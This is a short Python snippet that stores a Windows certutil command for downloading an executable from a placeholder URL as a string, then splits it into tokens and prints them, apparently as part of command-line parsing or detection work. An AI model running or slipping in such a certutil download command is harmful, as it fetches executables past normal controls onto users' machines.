script = "certutil.exe -urlcache -f https://www.example.org/file.exe file.exe"

def comm_split(script):
    for split in script.split():
        split_script = []
        split_script.append(split)
        print(split_script)